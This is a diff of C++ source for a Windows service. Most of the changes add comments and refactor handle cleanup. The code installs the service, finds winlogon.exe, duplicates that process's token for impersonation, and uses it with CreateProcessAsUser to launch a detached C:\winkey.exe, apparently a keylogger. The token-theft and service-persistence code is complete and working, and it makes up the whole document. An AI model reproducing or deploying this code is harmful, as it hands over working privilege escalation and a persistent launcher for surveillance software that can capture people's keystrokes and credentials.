@@ -4,12 +4,14 @@ void Service::Install()
 {
 	std::cout << "Installing service\n";
 
+	/* Open service manager */
 	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
 	if (schSCManager == nullptr) {
 		std::cout << std::format("OpenSCManager failed ({})\n", GetLastError());
 		return;
 	}
 
+	/* Create service with permissions */
 	SC_HANDLE schService = CreateService(
 		schSCManager,
 		SVCNAME,
@@ -38,12 +40,15 @@ void Service::Install()
 	}
 
 	std::cout << "Service installed successfully\n";
+
+	/* Cleanup handles */
 	CloseServiceHandle(schService);
 	CloseServiceHandle(schSCManager);
 }
 
-std::tuple<SC_HANDLE, SC_HANDLE> Service::getHandlers()
+SC_HANDLE Service::getService()
 {
+	/* Open handle to ServiceManger */
 	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
 	if (schSCManager == nullptr) {
 		const DWORD lastError = GetLastError();
@@ -53,29 +58,32 @@ std::tuple<SC_HANDLE, SC_HANDLE> Service::getHandlers()
 		else {
 			std::cout << std::format("OpenSCManager failed ({})\n", lastError);
 		}
-		return std::tuple(nullptr, nullptr);
+		return nullptr;
 	}
 
+	/* Open handle to service */
 	SC_HANDLE schService = OpenService(
 		schSCManager,
 		SVCNAME,
 		SERVICE_ALL_ACCESS
 	);
+	CloseServiceHandle(schSCManager);
 	if (schService == nullptr) {
 		std::cout << std::format("OpenService failed ({})\n", GetLastError());
-		CloseServiceHandle(schSCManager);
-		return std::tuple(nullptr, nullptr);
+		return nullptr;
 	}
-	return std::make_tuple(schSCManager, schService);
+	return schService;
 }
 
 void Service::Start()
 {
-	auto [schSCManager, schService] = Service::getHandlers();
-	if (schSCManager == nullptr || schService == nullptr) {
+	/* Fetch service */
+	auto schService = Service::getService();
+	if (schService == nullptr) {
 		return;
 	}
 
+	/* Start service */
 	std::cout << "Starting service\n";
 	if (StartService(schService, 0, nullptr)) {
 		std::cout << "Service started succesfully\n";
@@ -90,17 +98,19 @@ void Service::Start()
 		}
 	}
 
+	/* Cleanup handle */
 	CloseServiceHandle(schService);
-	CloseServiceHandle(schSCManager);
 }
 
 void Service::Stop()
 {
-	auto [schSCManager, schService] = Service::getHandlers();
-	if (schSCManager == nullptr || schService == nullptr) {
+	/* Fetch service */
+	auto schService = Service::getService();
+	if (schService == nullptr) {
 		return;
 	}
 
+	/* Send service STOP event */
 	std::cout << "Stopping service\n";
 	if (ControlService(schService, SERVICE_CONTROL_STOP, &Service::gSvcStatus)) {
 		std::cout << "Service stopped successfully\n";
@@ -115,17 +125,19 @@ void Service::Stop()
 		}
 	}
 
+	/* Cleanup handle */
 	CloseServiceHandle(schService);
-	CloseServiceHandle(schSCManager);
 }
 
 void Service::Delete()
 {
-	auto [schSCManager, schService] = Service::getHandlers();
-	if (schSCManager == nullptr || schService == nullptr) {
+	/* Fetch service */
+	auto schService = Service::getService();
+	if (schService == nullptr) {
 		return;
 	}
 
+	/* Send service stop event */
 	if (ControlService(schService, SERVICE_CONTROL_STOP, &Service::gSvcStatus)) {
 		std::cout << "Stopping service\n";
 		while (QueryServiceStatus(schService, &Service::gSvcStatus)) {
@@ -145,12 +157,14 @@ void Service::Delete()
 	else {
 		std::cout << std::format("DeleteService failed ({})\n", GetLastError());
 	}
+
+	/* Cleanup handle */
 	CloseServiceHandle(schService);
-	CloseServiceHandle(schSCManager);
 }
 
 void WINAPI Service::Main()
 {
+	/* Save handle to edit the status later */
 	Service::gSvcStatusHandle = RegisterServiceCtrlHandler(
 		SVCNAME,
 		reinterpret_cast<LPHANDLER_FUNCTION>(ControlHandler)
@@ -164,13 +178,16 @@ void WINAPI Service::Main()
 	Service::gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
 	Service::gSvcStatus.dwServiceSpecificExitCode = 0;
 
+	/* Set service to Pending */
 	ReportStatus(SERVICE_START_PENDING, NO_ERROR, 3000);
 
+	/* Init service and continue flow */
 	Service::Init();
 }
 
 void WINAPI Service::Init()
 {
+	/* Create startup event */
 	Service::ghSvcStopEvent = CreateEvent(
 		nullptr,
 		TRUE,
@@ -182,11 +199,14 @@ void WINAPI Service::Init()
 		return;
 	}
 
+	/* Set service running state */
 	ReportStatus(SERVICE_RUNNING, NO_ERROR, 0);
 
 	/* Setup service subprocess */
 	STARTUPINFO si = { 0 };
 	PROCESS_INFORMATION pi = { 0 };
+
+	/* Create the detached process to host the winkey */
 	Service::StartProcess(&si, &pi);
 
 	/* Wait until service stop request */
@@ -209,6 +229,7 @@ void WINAPI Service::Init()
 	CloseHandle(si.hStdOutput);
 }
 
+/* From microsoft docs */
 void WINAPI Service::ControlHandler(DWORD dwCtrl)
 {
 	switch (dwCtrl) {
@@ -223,6 +244,7 @@ void WINAPI Service::ControlHandler(DWORD dwCtrl)
 	}
 }
 
+/* From microsoft docs */
 void Service::ReportStatus(DWORD dwCurrentState,
 	DWORD dwWin32ExitCode,
 	DWORD dwWaitHint)
@@ -233,6 +255,7 @@ void Service::ReportStatus(DWORD dwCurrentState,
 	Service::gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
 	Service::gSvcStatus.dwWaitHint = dwWaitHint;
 
+	/* Compute status */
 	if (dwCurrentState == SERVICE_START_PENDING) {
 		Service::gSvcStatus.dwControlsAccepted = 0;
 	}
@@ -247,6 +270,7 @@ void Service::ReportStatus(DWORD dwCurrentState,
 		Service::gSvcStatus.dwCheckPoint = ++dwCheckPoint;
 	}
 
+	/* Set new status */
 	SetServiceStatus(Service::gSvcStatusHandle, &Service::gSvcStatus);
 }
 
@@ -255,21 +279,25 @@ void Service::ReportStatus(DWORD dwCurrentState,
 */
 HANDLE Service::GetToken()
 {
+	/* Snapshot the current processes */
 	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (hProcessSnap == INVALID_HANDLE_VALUE) {
 		std::cout << std::format("CreateToolhelp32Snapshot failed ({})\n", GetLastError());
 		return nullptr;
 	}
 
+	/* Create container for futur process */
 	PROCESSENTRY32 pe32;
 	pe32.dwSize = sizeof(PROCESSENTRY32);
 	
+	/* Find the first process of the snapshot */
 	if (!Process32First(hProcessSnap, &pe32)) {
 		std::cout << std::format("Process32First failed ({})\n", GetLastError());
 		CloseHandle(hProcessSnap);
 		return nullptr;
 	}
 
+	/* Find winlogon PID */
 	DWORD logonPID = 0;
 	do {
 		if (lstrcmpi(pe32.szExeFile, TEXT("winlogon.exe")) == 0) {
@@ -278,18 +306,19 @@ HANDLE Service::GetToken()
 		}
 	} while (Process32Next(hProcessSnap, &pe32));
 	CloseHandle(hProcessSnap);
-
 	if (logonPID == 0) {
 		std::cout << std::format("Process32Next failed ({})\n", GetLastError());
 		return nullptr;
 	}
 
+	/* Open HANDLE to winlogon process using PID */
 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, logonPID);
 	if (hProcess == nullptr) {
 		std::cout << std::format("OpenProcess failed ({})\n", GetLastError());
 		return nullptr;
 	}
 
+	/* Fetch the token from the process */
 	HANDLE hToken = nullptr;
 	OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken);
 	CloseHandle(hProcess);
@@ -298,6 +327,7 @@ HANDLE Service::GetToken()
 		return nullptr;
 	}
 
+	/* Duplicate token using Impersonation */
 	HANDLE hTokenD = nullptr;
 	DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hTokenD);
 	CloseHandle(hToken);
@@ -311,12 +341,14 @@ HANDLE Service::GetToken()
 
 void Service::StartProcess(STARTUPINFO* si, PROCESS_INFORMATION* pi)
 {
+	/* Fetch impersonated token */
 	HANDLE hToken = GetToken();
 	if (hToken == nullptr) {
 		std::cout << std::format("GetToken failed ({})\n", GetLastError());
 		return;
 	}
 
+	/* Open the winkey process, detached with the token */
 	CreateProcessAsUser(hToken,
 		TEXT("C:\\winkey.exe"),
 		nullptr,
@@ -330,6 +362,7 @@ void Service::StartProcess(STARTUPINFO* si, PROCESS_INFORMATION* pi)
 		pi
 	);
 
+	/* Free token handle we previously copied */
 	CloseHandle(hToken);
 }
 
@@ -339,6 +372,7 @@ void Service::StartProcess(STARTUPINFO* si, PROCESS_INFORMATION* pi)
 */
 int __cdecl _tmain(int argc, TCHAR* argv[])
 {
+	/* Handle commands */
 	if (argc == 2) {
 		if (lstrcmpi(argv[1], TEXT("install")) == 0) {
 			Service::Install();
@@ -358,12 +392,14 @@ int __cdecl _tmain(int argc, TCHAR* argv[])
 		}
 	}
 
+	/* Define service entry point */
 	SERVICE_TABLE_ENTRY DispatchTable[] = {{
 			const_cast<LPSTR>(SVCNAME),
 			reinterpret_cast<LPSERVICE_MAIN_FUNCTION>(Service::Main)},
 		{NULL, NULL}
 	};
 
+	/* Connect the thread as a service dispatcher */
 	StartServiceCtrlDispatcher(DispatchTable);
 	return 0;
 }
